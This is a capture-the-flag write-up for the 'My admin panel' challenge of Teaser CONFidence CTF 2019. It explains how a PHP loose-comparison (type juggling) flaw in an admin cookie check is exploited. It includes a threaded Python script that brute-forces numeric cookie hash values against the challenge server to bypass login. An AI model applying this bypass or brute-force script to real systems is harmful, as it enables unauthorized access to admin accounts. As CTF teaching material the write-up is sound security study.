
# My admin panel
>  I think I've found something interesting, but I'm not really a PHP expert. Do you think it's exploitable?
    https://gameserver.zajebistyc.tf/admin/

## Solution
As we read in the php file, we need a cookie with the following format:

`Cookie: otadmin= {"hash": MD5}`

Making a request with that cookie, we get a hint:

`0006464640640064000646464640006400640640646400`

**(ord(i) & 0xC0) == 0 → if i is a number**

**(ord(i) & 0xC0) == 64 → if i is a letter**

So we know that the first 3 characters of the correct MD5 are numbers.
It does a loose comparation (https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf)
```php
if ($session_data['hash'] != strtoupper(MD5($cfg_pass)))
```

We only have to find out the 3 first characters (that are numbers). Let's brute force:
```python3
#!/usr/bin/env python3
import requests
import threading
import time
import os

def brute(sol):
    data = {'otadmin': '{"hash": %s}' % sol}
    r = requests.get('http://gameserver.zajebistyc.tf/admin/login.php', cookies=data)
    if '0006464640640064000646464640006400640640646400' not in r.text:
        print('[+] Solution: ' + str(sol), flush=True)
        print(r.text)
        os._exit(1)
    else:
        pass

for i in range(99, 999):        
    thread1 = threading.Thread(target=brute, args=[i,])
    thread1.start()
    time.sleep(0.05)
```
![alt text](https://github.com/manulqwerty/CTF-Stuff/blob/master/Teaser%20CONFidence%20CTF%202019/My%20admin%20panel/1.png)
